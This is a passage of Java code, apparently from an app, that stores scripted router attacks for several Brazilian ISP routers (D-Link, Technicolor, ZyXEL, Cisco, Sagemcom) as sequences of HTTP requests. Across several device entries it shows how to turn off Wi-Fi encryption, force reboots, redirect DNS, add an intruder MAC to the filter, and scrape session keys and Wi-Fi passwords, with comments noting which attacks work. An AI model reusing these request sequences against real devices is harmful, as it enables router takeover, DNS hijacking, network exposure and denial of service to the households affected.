			mPostGetDao.insert(new PostGet(213, 20, 7, "get", "/Administration.asp", "Management", 0));
			mPostGetDao.insert(new PostGet(214, 20, 8, "get", "/Devicerestart.asp", "Device Restart", 0));
			mPostGetDao.insert(new PostGet(215, 20, 9, "post", "/goform/Devicerestart", "", 1));														
				mParamsDao.insert(new Params(245, 215, "devicerestrat_Password_check", "insereSenha"));
				mParamsDao.insert(new Params(246, 215, "mtenRestore", "Device Restart"));
				mParamsDao.insert(new Params(247, 215, "devicerestart", "1"));
				mParamsDao.insert(new Params(248, 215, "devicerestrat_getUsercheck", "true"));
			mPostGetDao.insert(new PostGet(216, 20, 10, "get", "/index.asp", "", 0));	
			
		/*******************************************************End Filtro MAC******************************************************/
		
			
		/******************************************************Start Abrir Rede*****************************************************/
//		GVT D-Link DSL-2640B
		mAtaqueDao.insert(new Ataque(21, "abrirrede", "gvt", 0, "D-Link DSL-2640B"));
			mPostGetDao.insert(new PostGet(217, 21, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(218, 21, 2, "get", "/logo.html", "logoBody", 1));
			mPostGetDao.insert(new PostGet(219, 21, 3, "get", "/menu.html", "mainMenuBody", 1));
			mPostGetDao.insert(new PostGet(220, 21, 4, "get", "/info.html", "DSL-2640B", 1));
			mPostGetDao.insert(new PostGet(221, 21, 5, "get", "/wlswitchinterface0.wl", "", 1));
			mPostGetDao.insert(new PostGet(222, 21, 6, "get", "/wlcfgrefresh.wl?wlRefresh=0", "", 1));
			mPostGetDao.insert(new PostGet(223, 21, 7, "get", "/wlsecurity.html", "", 1));
			mPostGetDao.insert(new PostGet(224, 21, 8, "get", "/wlsecurity.wl?wl_wsc_mode=disabled" +
																			 "&wl_wsc_reg=disabled" +
																			 "&wsc_config_state=1" +
																			 "&wlAuthMode=open" +
																			 "&wlAuth=0" +
																			 "&wlWep=disabled" +
																			 "&wlWpa=tkip" +
																			 "&wlKeyBit=1" +
																			 "&wlPreauth=0" +
																			 "&wlSsidIdx=0" +
																			 "&wlSyncNvram=1", "", 1));
			mPostGetDao.insert(new PostGet(225, 21, 9, "get", "/wlsecrefresh.wl?wlRefresh=0", "", 1));
			

//		Oi technicolor TD5136v2 / TD5130v2			
		mAtaqueDao.insert(new Ataque(22, "abrirrede", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
			mPostGetDao.insert(new PostGet(226, 22, 1, "post", "/login.cgi", "/index.cgi", 1));		
				mParamsDao.insert(new Params(249, 226, "isSubmit", "1"));
				mParamsDao.insert(new Params(250, 226, "username", "insereUsuario"));
				mParamsDao.insert(new Params(251, 226, "password", "insereSenha"));			
			mPostGetDao.insert(new PostGet(227, 22, 2, "get", "/index.cgi", "ADSL Router Webserver", 0));
			mPostGetDao.insert(new PostGet(228, 22, 3, "get", "/top.cgi", "Welcome to WEB Configuration", 0));	
			mPostGetDao.insert(new PostGet(229, 22, 4, "get", "/code.cgi", "SETUP WIZARD", 0));	
			mPostGetDao.insert(new PostGet(230, 22, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));
			mPostGetDao.insert(new PostGet(231, 22, 6, "get", "/wlsettings.cgi", "", 0));
			mPostGetDao.insert(new PostGet(232, 22, 7, "get", "/wlwpa.cgi", "", 0));	
			mPostGetDao.insert(new PostGet(233, 22, 8, "post", "/wlwpa.cgi", "", 0));		//TIMEOUT
				mParamsDao.insert(new Params(252, 233, "submitValue", "1"));
				mParamsDao.insert(new Params(253, 233, "wpaSSID", "0"));
				mParamsDao.insert(new Params(254, 233, "security_method", "0"));				
				mParamsDao.insert(new Params(255, 233, "auth_type", "both"));
				mParamsDao.insert(new Params(256, 233, "wepEnabled", "ON"));
				mParamsDao.insert(new Params(257, 233, "length0", "1"));		
				mParamsDao.insert(new Params(258, 233, "format0", "1"));		
				mParamsDao.insert(new Params(259, 233, "key0", ""));		
				mParamsDao.insert(new Params(260, 233, "wpaAuth", "psk"));		
				mParamsDao.insert(new Params(261, 233, "ciphersuite_a", "1"));		
				mParamsDao.insert(new Params(262, 233, "wpa2ciphersuite_a", "1"));		
				mParamsDao.insert(new Params(263, 233, "rekeytime", "86400"));		
				mParamsDao.insert(new Params(264, 233, "pskFormat", "0"));		
				mParamsDao.insert(new Params(265, 233, "pskValue", "meuoiveloxwifi"));	
				mParamsDao.insert(new Params(266, 233, "radiusIP", "0.0.0.0"));	
				mParamsDao.insert(new Params(267, 233, "radiusPort", "1812"));	
				mParamsDao.insert(new Params(268, 233, "radiusPass", ""));			

//		Oi ZyXEL AMG1202-T10B		***WORK BUT TIMEOUT***
		mAtaqueDao.insert(new Ataque(23, "abrirrede", "oi", 1, "ZyXEL AMG1202-T10B"));			
			mPostGetDao.insert(new PostGet(234, 23, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
				mParamsDao.insert(new Params(269, 234, "LoginPassword", "insereSenha"));
				mParamsDao.insert(new Params(270, 234, "LoginUsername", "insereUsuario"));
			mPostGetDao.insert(new PostGet(235, 23, 2, "get", "/MakeSession.asp", "", 0));	
			mPostGetDao.insert(new PostGet(236, 23, 3, "get", "/cgi-bin/Jump2Host.asp", "", 0));
			mPostGetDao.insert(new PostGet(237, 23, 4, "get", "/cgi-bin/rpSys.asp", "ZyXEL Prestige", 0));		
			mPostGetDao.insert(new PostGet(238, 23, 5, "get", "/cgi-bin/top.asp", "", 0));		
			mPostGetDao.insert(new PostGet(239, 23, 6, "get", "/cgi-bin/path.asp", "", 0));		
			mPostGetDao.insert(new PostGet(240, 23, 7, "get", "/cgi-bin/home.asp", "Home", 0));		
			mPostGetDao.insert(new PostGet(241, 23, 8, "get", "/cgi-bin/rpPanel.asp", "", 0));		
			mPostGetDao.insert(new PostGet(242, 23, 9, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(243, 23, 10, "get", "/cgi-bin/WLAN_General.asp?MSSID=0", "<input type=\"hidden\" name=\"hid_encryptionMode\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"hid_securityMode\" value=\"(.*?)\">;;" +
																									"<INPUT type=\"HIDDEN\" NAME=\"isDot1XSupported\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"SSID_INDEX\"  value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"CountryName\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"EnableWLanFlag\"  value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"CountryRegion0\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"CountryRegion1\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"CountryRegion2\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"CountryRegion3\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"CountryRegion5\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"CountryRegion6\" value=\"(.*?)\">;;" +
																									"<input type=\"text\" name=\"ESSID\" size=\"32\" maxlength=\"32\" onBlur=\"chkName\\(this\\)\" VALUE=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"HideSsidFlag\"  value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"WPACompatileFlag\" value=\"(.*?)\">;;" +
																									"<input type=\"hidden\" name=\"DefWEPKey\" value=\"(.*?)\">;;" +
																									"<input type=\"text\" name=\"WLANCfgPSK\" size=\"32\" maxlength=\"64\"  onBlur=\"wpapskCheck\\(this,1\\);\" value=\"(.*?)\" >;;" +
																									"<input type=\"text\" name=\"WLANCfgAuthenTimeout\" size=\"5\" maxlength=\"4\" value=\"(.*?)\" onBlur=chkAuthenTimeout\\(this.form\\) onKeyPress=chk_num\\(event\\);>;;" +
																									"<input type=\"text\" name=\"WLANCfgIdleTimeout\" size=\"5\" maxlength=\"4\" value=\"(.*?)\" onBlur=chkIdleTimeout\\(this.value\\) onKeyPress=chk_num\\(event\\);>;;" +
																									"<input type=\"text\"name=\"WLANCfgWPATimer\" size=\"5\" maxlength=\"5\" value=\"(.*?)\" onKeyPress=chk_num\\(event\\); >;;" +
																									"<input type=\"text\" name=\"WLANCfgRadiusServerAddr\" size=\"15\"  maxlength=\"15\" value=\"(.*?)\" >;;" +
																									"<input type=\"text\" name=\"WLANCfgRadiusServerPort\" size=\"5\"  maxlength=\"5\" value=\"(.*?)\" onBlur=checkPort\\(this.value,0\\) onKeyPress=chk_num\\(event\\); >;;" +
																									"<input type=\"text\" name=\"WLANCfgRadiusServerKey\" size=\"31\"  maxlength=\"127\" value=\"(.*?)\" >;;" +
																									"<input type=\"hidden\" name=\"WlanQosFlag\" value=\"(.*?)\">;;", 0));		
			mPostGetDao.insert(new PostGet(244, 23, 11, "get", "/cgi-bin/buttom.asp", "", 0));		
			mPostGetDao.insert(new PostGet(245, 23, 12, "post", "/cgi-bin/WLAN_General.asp", "", 0));		//TIMEOUT											
				mParamsDao.insert(new Params(271, 245, "hid_encryptionMode", "inserehid_encryptionMode"));		//1
				mParamsDao.insert(new Params(272, 245, "hid_securityMode", "inserehid_securityMode"));		//WPA2PSK
				mParamsDao.insert(new Params(273, 245, "isDot1XSupported", "1"));		//
				mParamsDao.insert(new Params(274, 245, "EnableWLAN", "on"));
				mParamsDao.insert(new Params(275, 245, "SSID_INDEX", "insereSSID_INDEX"));		//0
				mParamsDao.insert(new Params(276, 245, "CountryName", "insereCountryName"));		//BRAZIL
				mParamsDao.insert(new Params(277, 245, "EnableWLanFlag", "insereEnableWLanFlag"));		//1
				mParamsDao.insert(new Params(278, 245, "CountryRegion0", "insereCountryRegion0"));		//0
				mParamsDao.insert(new Params(279, 245, "CountryRegion1", "insereCountryRegion1"));		//1
				mParamsDao.insert(new Params(280, 245, "CountryRegion2", "insereCountryRegion2"));		//2
				mParamsDao.insert(new Params(281, 245, "CountryRegion3", "insereCountryRegion3"));		//3
				mParamsDao.insert(new Params(282, 245, "CountryRegion5", "insereCountryRegion5"));		//5
				mParamsDao.insert(new Params(283, 245, "CountryRegion6", "insereCountryRegion6"));		//6
				mParamsDao.insert(new Params(284, 245, "Countries_Channels", "BRAZIL"));		
				mParamsDao.insert(new Params(285, 245, "Channel_ID", "0"));
				mParamsDao.insert(new Params(286, 245, "ESSID", "insereESSID"));		//Oi_Velox_WiFi_520C
				mParamsDao.insert(new Params(287, 245, "HideSsidFlag", "insereHideSsidFlag"));		//0
				mParamsDao.insert(new Params(288, 245, "WPACompatileFlag", "insereWPACompatileFlag"));		//
				mParamsDao.insert(new Params(289, 245, "EncrypType", "NONE"));
				mParamsDao.insert(new Params(290, 245, "Security_Sel", "OPEN"));
				mParamsDao.insert(new Params(291, 245, "TKIPAESFlag", "0"));
				mParamsDao.insert(new Params(292, 245, "TKIPAES_Sel", "TKIPAES"));
				mParamsDao.insert(new Params(293, 245, "WLANCfgPphrase", ""));
				mParamsDao.insert(new Params(294, 245, "DefWEPKey", "insereDefWEPKey"));		//1
				mParamsDao.insert(new Params(295, 245, "WLANCfgPSK", "insereWLANCfgPSK"));		//meuoiveloxwifi
				mParamsDao.insert(new Params(296, 245, "WLANCfgAuthenTimeout", "insereWLANCfgAuthenTimeout"));		//100
				mParamsDao.insert(new Params(297, 245, "WLANCfgIdleTimeout", "insereWLANCfgIdleTimeout"));		//60
				mParamsDao.insert(new Params(298, 245, "WLANCfgWPATimer", "insereWLANCfgWPATimer"));		//3600
				mParamsDao.insert(new Params(299, 245, "WLANCfgRadiusServerAddr", "insereWLANCfgRadiusServerAddr"));		//192.168.7.203	
				mParamsDao.insert(new Params(300, 245, "WLANCfgRadiusServerPort", "insereWLANCfgRadiusServerPort"));			//1812
				mParamsDao.insert(new Params(301, 245, "WLANCfgRadiusServerKey", "insereWLANCfgRadiusServerKey"));		//12345678
				mParamsDao.insert(new Params(302, 245, "WlanQosFlag", "insereWlanQosFlag"));		//0	
				mParamsDao.insert(new Params(303, 245, "doSubmitFlag", "0"));			
			

//		NET Cisco DPC3925		***DIDNT TEST***
		mAtaqueDao.insert(new Ataque(24, "abrirrede", "net", 1, "Cisco DPC3925"));			
			mPostGetDao.insert(new PostGet(246, 24, 1, "post", "/goform/Docsis_system", "Setup", 1));														
				mParamsDao.insert(new Params(304, 246, "username_login", "insereUsuario"));
				mParamsDao.insert(new Params(305, 246, "password_login", "insereSenha"));
				mParamsDao.insert(new Params(306, 246, "LanguageSelect", "en"));
				mParamsDao.insert(new Params(307, 246, "Language_Submit", "0"));
				mParamsDao.insert(new Params(308, 246, "login", "Log In"));
			mPostGetDao.insert(new PostGet(247, 24, 2, "get", "/Quick_setup.asp", "<input type=\"text\" maxlength=\"32\" name=\"ssid\" id=\"ssid\" value=\"(.*?)\" />;;" +
																				  "<input type=\"password\" class=\"num\" id=\"wpa_psk_key\" name=\"wpa_psk_key\" size=\"32\" maxlength=\"64\" value=\"(.*?)\" onKeyDown=\"keyCheck\\(this\\)\"  onSelect=\"textSelected=true\" />;;" +
																				  "<input type=\"hidden\" name=\"h_tx_key\" value=\"(.*?)\">\n" +
																				  "<input type=\"hidden\" name=\"h_setup_wifi_enable\" value=\"(.*?)\">;;" +
																				  "<input type=\"hidden\" name=\"h_security_mode\" value=\"(.*?)\">;;" +
																				  "<input type=\"hidden\" name=\"qs_wds_setting\" value=\"(.*?)\" />;;" +
																				  "<input type=\"hidden\" name=\"UserId\" value=\"(.*?)\">;;", 0));
			mPostGetDao.insert(new PostGet(248, 24, 3, "post", "/goform/Quick_setup", "", 0));														
				mParamsDao.insert(new Params(309, 248, "Password", ""));
				mParamsDao.insert(new Params(310, 248, "PasswordReEnter", ""));
				mParamsDao.insert(new Params(311, 248, "setup_wifi_enable", "enable"));
				mParamsDao.insert(new Params(312, 248, "ssid", "inseressid"));		//ce3186
				mParamsDao.insert(new Params(313, 248, "security_mode", "disabled"));
				mParamsDao.insert(new Params(314, 248, "wpa_psk_key", "inserewpa_psk_key"));	//249503002
				mParamsDao.insert(new Params(315, 248, "radius_ip_1", "0"));
				mParamsDao.insert(new Params(316, 248, "radius_ip_2", "0"));
				mParamsDao.insert(new Params(317, 248, "radius_ip_3", "0"));
				mParamsDao.insert(new Params(318, 248, "radius_ip_4", "0"));
				mParamsDao.insert(new Params(319, 248, "keysize", "64"));
				mParamsDao.insert(new Params(320, 248, "tx_key", "inseretx_key"));		//1
				mParamsDao.insert(new Params(321, 248, "save", "Save Settings"));
				mParamsDao.insert(new Params(322, 248, "h_setup_wifi_enable", "insereh_setup_wifi_enable"));		//enable
				mParamsDao.insert(new Params(323, 248, "h_security_mode", "insereh_security_mode"));		//disabled
				mParamsDao.insert(new Params(324, 248, "h_wpa_enc", ""));
				mParamsDao.insert(new Params(325, 248, "qs_wds_setting", "insereqs_wds_setting"));		//disable
				mParamsDao.insert(new Params(326, 248, "UserId", "insereUserId"));		//

		/*******************************************************End Abrir Rede******************************************************/

				
		/*******************************************************Start Login*******************************************************/	
//		Oi Sagemcom F@st2704N			
		mAtaqueDao.insert(new Ataque(25, "login", "oi", 0, "Sagemcom F@st2704N"));			
			mPostGetDao.insert(new PostGet(249, 25, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(250, 25, 2, "get", "/main.html", "DSL Router", 1));		
			mPostGetDao.insert(new PostGet(251, 25, 3, "get", "/logo.html", "", 1));		
			mPostGetDao.insert(new PostGet(252, 25, 4, "get", "/menu.html", "", 1));
			mPostGetDao.insert(new PostGet(253, 25, 5, "get", "/menufake.html", "mainMenuBody", 1));			
			mPostGetDao.insert(new PostGet(254, 25, 6, "get", "/footer.html", "SAGEMCOM Corporation", 1));			
			mPostGetDao.insert(new PostGet(255, 25, 7, "get", "/info.html", "F@ST", 1));		
			
//		GVT Sagemcom PowerBox F@st2764		
		mAtaqueDao.insert(new Ataque(26, "login", "gvt", 0, "Sagemcom PowerBox F@st2764"));			
			mPostGetDao.insert(new PostGet(256, 26, 1, "get", "", "Power Box GVT", 1));					
			
		/********************************************************End Login********************************************************/

		
		/******************************************************Start Reboot*******************************************************/		
//		Oi Sagemcom F@st2704N			
		mAtaqueDao.insert(new Ataque(27, "reboot", "oi", 0, "Sagemcom F@st2704N"));			
			mPostGetDao.insert(new PostGet(257, 27, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(258, 27, 2, "get", "/main.html", "DSL Router", 1));		
			mPostGetDao.insert(new PostGet(259, 27, 3, "get", "/logo.html", "", 1));		
			mPostGetDao.insert(new PostGet(260, 27, 4, "get", "/menu.html", "", 1));
			mPostGetDao.insert(new PostGet(261, 27, 5, "get", "/menufake.html", "mainMenuBody", 1));			
			mPostGetDao.insert(new PostGet(262, 27, 6, "get", "/footer.html", "SAGEMCOM Corporation", 1));			
			mPostGetDao.insert(new PostGet(263, 27, 7, "get", "/info.html", "F@ST", 1));			
			mPostGetDao.insert(new PostGet(264, 27, 8, "get", "/wancfg.cmd?action=refresh", "", 1));			
			mPostGetDao.insert(new PostGet(265, 27, 9, "get", "/backupsettings.html", "Backup", 1));			
			mPostGetDao.insert(new PostGet(266, 27, 10, "get", "/wancfg.cmd?action=refresh", "", 1));			
			mPostGetDao.insert(new PostGet(267, 27, 11, "get", "/resetrouter.html", "var sessionKey=\'(.*?)\'", 1));			
			mPostGetDao.insert(new PostGet(268, 27, 12, "get", "/rebootinfo.cgi?sessionKey=inseresessionKey", "DSL Reinicialização do roteador", 1));		//719914237				

//		GVT Sagemcom PowerBox F@st2764				
		mAtaqueDao.insert(new Ataque(28, "reboot", "gvt", 0, "Sagemcom PowerBox F@st2764"));			
			mPostGetDao.insert(new PostGet(269, 28, 1, "get", "", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));			
			mPostGetDao.insert(new PostGet(270, 28, 2, "get", "/index.cgi?page=language&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//8wOy77x8i4I9m679Al3c2MPuP5geQOq			
			mPostGetDao.insert(new PostGet(271, 28, 3, "get", "/index.cgi?page=resets&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//8wOy77x8i4I9m679Al3c2MPuP5geQOq						
			mPostGetDao.insert(new PostGet(272, 28, 4, "post", "/index.cgi", "", 2));			
				mParamsDao.insert(new Params(327, 272, "page", "resets"));		
				mParamsDao.insert(new Params(328, 272, "sessionid", "inseresessionid"));		//8wOy77x8i4I9m679Al3c2MPuP5geQOq						
				mParamsDao.insert(new Params(329, 272, "action", "submit"));		
				mParamsDao.insert(new Params(330, 272, "update", "0"));		
				mParamsDao.insert(new Params(331, 272, "factory_reset", "reboot"));		
				mParamsDao.insert(new Params(332, 272, "factory_reboot", ""));
				
		/*******************************************************End Reboot********************************************************/	
		
		
		/********************************************************Start DNS********************************************************/
//		Oi Sagemcom F@st2704N			
		mAtaqueDao.insert(new Ataque(29, "dns", "oi", 0, "Sagemcom F@st2704N"));			
			mPostGetDao.insert(new PostGet(273, 29, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(274, 29, 2, "get", "/main.html", "DSL Router", 1));		
			mPostGetDao.insert(new PostGet(275, 29, 3, "get", "/logo.html", "", 1));		
			mPostGetDao.insert(new PostGet(276, 29, 4, "get", "/menu.html", "", 1));
			mPostGetDao.insert(new PostGet(277, 29, 5, "get", "/menufake.html", "mainMenuBody", 1));			
			mPostGetDao.insert(new PostGet(278, 29, 6, "get", "/footer.html", "SAGEMCOM Corporation", 1));			
			mPostGetDao.insert(new PostGet(279, 29, 7, "get", "/info.html", "F@ST", 1));			
			mPostGetDao.insert(new PostGet(280, 29, 8, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(281, 29, 9, "get", "/dslatm.cmd", "", 1));
			mPostGetDao.insert(new PostGet(282, 29, 10, "get", "/dnscfg.html", "var sessionKey=\'(.*?)\'", 1));
			mPostGetDao.insert(new PostGet(283, 29, 11, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(284, 29, 12, "get", "/dnscfg.cgi?dnsPrimary=8.8.8.8&dnsSecondary=8.8.4.4&dnsIfcsList=&dnsRefresh=1&sessionKey=inseresessionKey", "var sessionKey=\'(.*?)\'", 1));		//844646178
			mPostGetDao.insert(new PostGet(285, 29, 13, "get", "/dnscfg.cgi?dnsRefresh=0&sessionKey=inseresessionKey", "", 1));		//1828718257
			mPostGetDao.insert(new PostGet(286, 29, 14, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(287, 29, 15, "get", "/backupsettings.html", "Backup", 1));			
			mPostGetDao.insert(new PostGet(288, 29, 16, "get", "/wancfg.cmd?action=refresh", "", 1));			
			mPostGetDao.insert(new PostGet(289, 29, 17, "get", "/resetrouter.html", "var sessionKey=\'(.*?)\'", 1));					
			mPostGetDao.insert(new PostGet(290, 29, 18, "get", "/rebootinfo.cgi?sessionKey=inseresessionKey", "DSL Reinicialização do roteador", 1));		//719914237			
				
		/*********************************************************End DNS*********************************************************/
		
		
		/****************************************************Start Acesso Remoto**************************************************/	
		/*****************************************************End Acesso Remoto***************************************************/
				
		
		/*****************************************************Start Filtro MAC****************************************************/	
//		Oi Sagemcom F@st2704N		***DONT WORK***			
		mAtaqueDao.insert(new Ataque(30, "filtromac", "oi", 0, "Sagemcom F@st2704N"));			
			mPostGetDao.insert(new PostGet(291, 30, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(292, 30, 2, "get", "/main.html", "DSL Router", 1));		
			mPostGetDao.insert(new PostGet(293, 30, 3, "get", "/logo.html", "", 1));		
			mPostGetDao.insert(new PostGet(294, 30, 4, "get", "/menu.html", "", 1));
			mPostGetDao.insert(new PostGet(295, 30, 5, "get", "/menufake.html", "mainMenuBody", 1));			
			mPostGetDao.insert(new PostGet(296, 30, 6, "get", "/footer.html", "SAGEMCOM Corporation", 1));			
			mPostGetDao.insert(new PostGet(298, 30, 7, "get", "/info.html", "F@ST", 1));		
			mPostGetDao.insert(new PostGet(299, 30, 8, "get", "/wancfg.cmd?action=refresh", "", 1));		
			mPostGetDao.insert(new PostGet(300, 30, 9, "get", "/wlswitchinterface0.wl", "", 1));		
			mPostGetDao.insert(new PostGet(301, 30, 10, "get", "/wancfg.cmd?action=refresh", "", 1));		
			mPostGetDao.insert(new PostGet(302, 30, 11, "get", "/wlmacflt.cmd?action=view", "", 1));		
			mPostGetDao.insert(new PostGet(303, 30, 12, "get", "/wlmacflt.html", "loc \\+= \'&sessionKey=(.*?)\';", 1));
			mPostGetDao.insert(new PostGet(304, 30, 13, "get", "/wancfg.cmd?action=refresh", "", 1));	
			mPostGetDao.insert(new PostGet(305, 30, 14, "get", "/wlmacflt.cmd?action=add&wlFltMacAddr=90:00:4E:AC:F6:B5&wlSyncNvram=1&sessionKey=inseresessionKey", "", 1));		//203034290	
			mPostGetDao.insert(new PostGet(306, 30, 15, "get", "/wancfg.cmd?action=refresh", "", 1));		//TIMEOUT	
			mPostGetDao.insert(new PostGet(307, 30, 16, "get", "/wlmacflt.cmd?action=view", "loc \\+= \'&sessionKey=(.*?)\';", 1));	
			mPostGetDao.insert(new PostGet(308, 30, 17, "get", "/wlmacflt.cmd?action=refresh&sessionKey=inseresessionKey", "", 1));		//811539311	
			mPostGetDao.insert(new PostGet(309, 30, 18, "get", "/wancfg.cmd?action=refresh", "", 1));	
			mPostGetDao.insert(new PostGet(310, 30, 19, "get", "/wlmacflt.html", "loc \\+= \'&sessionKey=(.*?)\';", 1));	
			mPostGetDao.insert(new PostGet(311, 30, 20, "get", "/wancfg.cmd?action=refresh", "", 1));	
			mPostGetDao.insert(new PostGet(312, 30, 21, "get", "/wlmacflt.cmd?action=add&wlFltMacAddr=insereMAC&wlSyncNvram=1&sessionKey=inseresessionKey", "", 1));		//34:BB:26:60:62:0D		//1040120023	
			mPostGetDao.insert(new PostGet(313, 30, 22, "get", "/wancfg.cmd?action=refresh", "", 1));	
			mPostGetDao.insert(new PostGet(314, 30, 23, "get", "/wlmacflt.cmd?action=view", "loc \\+= \'&sessionKey=(.*?)\';", 1));   	
			mPostGetDao.insert(new PostGet(315, 30, 24, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(316, 30, 25, "get", "/wlmacflt.cmd?action=save&wlFltMacMode=allow&sessionKey=inseresessionKey", "", 1));		//1102973013
			mPostGetDao.insert(new PostGet(317, 30, 26, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(318, 30, 27, "get", "/wlmacflt.cmd?action=view", "loc \\+= \'&sessionKey=(.*?)\';", 1));
			mPostGetDao.insert(new PostGet(319, 30, 28, "get", "/wlmacflt.cmd?action=refresh&sessionKey=inseresessionKey", "", 1));		//1485002985
			mPostGetDao.insert(new PostGet(320, 30, 29, "get", "/wancfg.cmd?action=refresh", "", 1));			
			mPostGetDao.insert(new PostGet(321, 30, 30, "get", "/backupsettings.html", "Backup", 1));			
			mPostGetDao.insert(new PostGet(322, 30, 31, "get", "/wancfg.cmd?action=refresh", "", 1));			
			mPostGetDao.insert(new PostGet(323, 30, 32, "get", "/resetrouter.html", "var sessionKey=\'(.*?)\'", 1));			
			mPostGetDao.insert(new PostGet(324, 30, 33, "get", "/rebootinfo.cgi?sessionKey=inseresessionKey", "DSL Reinicialização do roteador", 1));		//1603439650

//		GVT Sagemcom PowerBox F@st2764		***DONT WORK***				
		mAtaqueDao.insert(new Ataque(31, "filtromac", "gvt", 0, "Sagemcom PowerBox F@st2764"));			
			mPostGetDao.insert(new PostGet(325, 31, 1, "get", "", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));	
			mPostGetDao.insert(new PostGet(326, 31, 2, "get", "/index.cgi?page=internet&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
			mPostGetDao.insert(new PostGet(327, 31, 3, "get", "/index.cgi?page=wifi&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
			mPostGetDao.insert(new PostGet(328, 31, 4, "get", "/index.cgi?page=macfilter&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc	
			mPostGetDao.insert(new PostGet(329, 31, 5, "post", "/index.cgi", "", 2));		//TIMEOUT		
				mParamsDao.insert(new Params(333, 329, "page", "macfilter"));		
				mParamsDao.insert(new Params(334, 329, "sessionid", "inseresessionid"));		//TcHtrepEP3LHAJ7vSZ35YObDDy5Pusc					
				mParamsDao.insert(new Params(335, 329, "action", "submit"));		
				mParamsDao.insert(new Params(336, 329, "update", "1"));		
				mParamsDao.insert(new Params(337, 329, "flagadd", "1"));		
				mParamsDao.insert(new Params(338, 329, "nbrline", "2"));		
				mParamsDao.insert(new Params(339, 329, "keysaved", ""));		
				mParamsDao.insert(new Params(340, 329, "macfiltering", "1"));		
				mParamsDao.insert(new Params(341, 329, "id0", "-1"));			
				mParamsDao.insert(new Params(342, 329, "device0", "1"));			
				mParamsDao.insert(new Params(343, 329, "id1", "-1"));			
				mParamsDao.insert(new Params(344, 329, "device1", "2"));		
				mParamsDao.insert(new Params(345, 329, "device2", "-1"));		
				mParamsDao.insert(new Params(346, 329, "mac2", "90:00:4e:ac:f6:b5"));
			mPostGetDao.insert(new PostGet(330, 31, 6, "get", "/index.cgi", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));
			mPostGetDao.insert(new PostGet(331, 31, 7, "get", "/index.cgi?page=language&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//8I2jYz5wuVo6rgcFI2TyI3sm3gazrp7			
			mPostGetDao.insert(new PostGet(332, 31, 8, "get", "/index.cgi?page=resets&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//8I2jYz5wuVo6rgcFI2TyI3sm3gazrp7						
			mPostGetDao.insert(new PostGet(333, 31, 9, "post", "/index.cgi", "", 2));			
				mParamsDao.insert(new Params(347, 333, "page", "resets"));		
				mParamsDao.insert(new Params(348, 333, "sessionid", "inseresessionid"));		//8I2jYz5wuVo6rgcFI2TyI3sm3gazrp7						
				mParamsDao.insert(new Params(349, 333, "action", "submit"));		
				mParamsDao.insert(new Params(350, 333, "update", "0"));		
				mParamsDao.insert(new Params(351, 333, "factory_reset", "reboot"));		
				mParamsDao.insert(new Params(352, 333, "factory_reboot", ""));				

		/*******************************************************End Filtro MAC******************************************************/
		
		
		/******************************************************Start Abrir Rede*****************************************************/		
//		Oi Sagemcom F@st2704N		***WORK BUT TIMEOUT***			
		mAtaqueDao.insert(new Ataque(32, "abrirrede", "oi", 0, "Sagemcom F@st2704N"));			
			mPostGetDao.insert(new PostGet(353, 32, 1, "get", "", "DSL Router", 1));
			mPostGetDao.insert(new PostGet(354, 32, 2, "get", "/main.html", "DSL Router", 1));		
			mPostGetDao.insert(new PostGet(355, 32, 3, "get", "/logo.html", "", 1));		
			mPostGetDao.insert(new PostGet(356, 32, 4, "get", "/menu.html", "", 1));
			mPostGetDao.insert(new PostGet(357, 32, 5, "get", "/menufake.html", "mainMenuBody", 1));			
			mPostGetDao.insert(new PostGet(358, 32, 6, "get", "/footer.html", "SAGEMCOM Corporation", 1));			
			mPostGetDao.insert(new PostGet(359, 32, 7, "get", "/info.html", "F@ST", 1));			
